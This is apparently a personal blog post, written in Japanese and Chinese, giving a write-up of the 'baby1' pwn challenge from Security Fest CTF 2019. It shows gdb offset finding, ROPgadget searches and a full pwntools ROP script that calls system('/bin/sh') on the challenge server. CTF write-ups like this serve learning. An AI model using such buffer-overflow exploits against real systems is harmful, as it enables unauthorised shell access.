---
layout: post
title:  2019 Security Fest CTF Write-up
date:   2019-06-04 10:11:34 -0400
categories: CTF
---
今回のSecurity Fest CTF 2019で、私とSinonさんともう一人の友一緒にチームweRubb1shで参加しました。 321 ptsで803チーム中で108位でした。 私は一問を解けた。 そして初めてpwnを解けた、 でも私はまだまだですねw
![result](/images/SecurityFest2019/SecurityFestCTF.JPG)

這次是我第一次解掉pwn題，其實在Harekaze CTF 2019都在努力做，但一題也解不到

以下是窩解的題目

***

## [pwn] baby1 (Points: 146)

先把program run一次，看到"Rather ROP than RIP"，看來是ROP了
用checksec從下載下來的file看一下有什麼protection，這裡我忘了cap圖，所以pass掉

用gdb計一下要放多少個A在前面，開gdb然後做個string來overflow掉
```bash
$gdb -q baby1
gef> pattern create 150 #copy the string and paste to the input
```

之後跑那個program再input那段string，會有SIGSEGV的error出來
![gdbTest](/images/SecurityFest2019/gdbTest.PNG)

把rsp找出來再算他的offset
```bash
gef> x/gx $rsp
0x7fffffffdf18: 0x6161616161616164
gef> pattern offset 0x6161616161616164
```

把program放了在ida看了看，裡面有一個function(?)是能夠call system。而且也有/bin/sh在裡面 (沒cap圖)
用objdump把system的address找出來。其實也可以直接在objdump找有沒有system這東西
```bash
objdump -d baby1 | grep "system"
```
![objdumpSystem](/images/SecurityFest2019/objdump_system.png)

再用ROPgadget把/bin/sh的address找出來
```bash
ROPgadget --binary baby1 --string "/bin/sh"
```
![ROPbinsh](/images/SecurityFest2019/ROPbinsh.png)

將在做pop跟ret的address找出來，這次會用pop rdi，所以address是0x400793
```bash
ROPgadget --binary baby1 --only "pop|ret"
```
![ROPpopret](/images/SecurityFest2019/ROPpopret.png)

把找到的東西放在一起，以下是payload
```python
from pwn import *
import sys

elf = ELF('./baby1')
s = remote('baby-01.pwn.beer',10001)

rop_pop_rdi = 0x000400793	#addr of pop rdi
plt_system = 0x0004006ab	#addr of system
addr_binsh = 0x000400286	#addr of /bin/sh

payload = 'A' * 24
payload += p64(rop_pop_rdi)
payload += p64(addr_binsh)
payload += p64(plt_system)
print("[*] Payload: " + payload)
print "[*] Sending payload"
s.sendline(payload) 	#send payload

s.interactive()			#keep connection
```

結果如下
![runpayload](/images/SecurityFest2019/run.png)

***
但其實我還不太明白整個原理是怎樣，還在摸索中
所以就這樣吧~
